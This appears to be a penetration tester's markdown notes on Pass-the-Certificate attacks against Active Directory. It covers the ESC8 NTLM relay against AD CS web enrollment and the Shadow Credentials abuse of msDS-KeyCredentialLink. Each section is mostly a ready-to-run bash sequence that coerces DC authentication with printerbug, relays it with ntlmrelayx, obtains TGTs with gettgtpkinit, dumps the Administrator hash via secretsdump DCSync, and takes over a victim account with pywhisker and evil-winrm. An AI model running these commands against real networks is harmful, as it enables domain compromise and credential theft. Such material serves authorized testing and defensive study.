[PKINIT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b), short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards

`Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)` Used primary alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

PKINIT not available? See [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/)

## AD CS NTLM Relay Attack (ESC8)

NTLM relay attack targeting ADCS HTTP endpoints.

A CA configured to allow web enrollment typically hosts from /CertSrv

Requirements:
	Exposed CA
	Printer Spooler service running (forced auth method via [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py))

TO DO:
```
netexec ESC8 stuff
```

Attack Demonstration
```bash
# Enumerate certificate template (possibly skip...)
certipy find -u 'user' -p 'pass' -target <target> -text -stdout -vulnerable

# Listen for inbound connections and relay to web enrollment service
impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp --adcs -smb2support --template <certificate_template> # Default -- "KerberosAuthentication"

# Wait for victims to attempt auth against their machine
OR
# Force machine accounts to auth (Print Spooler service must be running)
python3 printerbug.py <DOAMIN>/<user>:"<password>"@<DC_ip> <attacker_ip>
 
# Catch auth request output and certificate issued for the DC

# Install gettgtpkinit.py and requirements
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git

# Obtain TGT as DC01$ and DCSync
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip <dc_ip> '<domain>/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip <dc_ip> -just-dc-user Administrator '<domain>/DC01$'@DC01.<domain> [-use-ntds]
```

## Shadow Credentials (msDS-KeyCredentialLink)
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

Attack Demonstration
```bash
# Generate x.509 cert and write public key to victim user
pywhisker --dc-ip <DC_ip> -d <domain> -u <user> -p '<password>' --target <VICTIM_user> --action add   # make note of .pfx file created and password

# Aquire TGT as victim user
python3 gettgtpkinit.py -cert-pfx ../<file.pfx> -pfx-pass '<pfx_password>' -dc-ip <DC_ip> <DOMAIN>/<user> /tmp/<user.ccache>

# pass the ticket
export KRB5CCNAME=/tmp/<user.ccache>
klist   # verify successfil import

# Abuse (example is exil-winrm)
evil-winrm -i <dc.hostname>.<domain> -r <domain>   # See PtT notes for full setup
```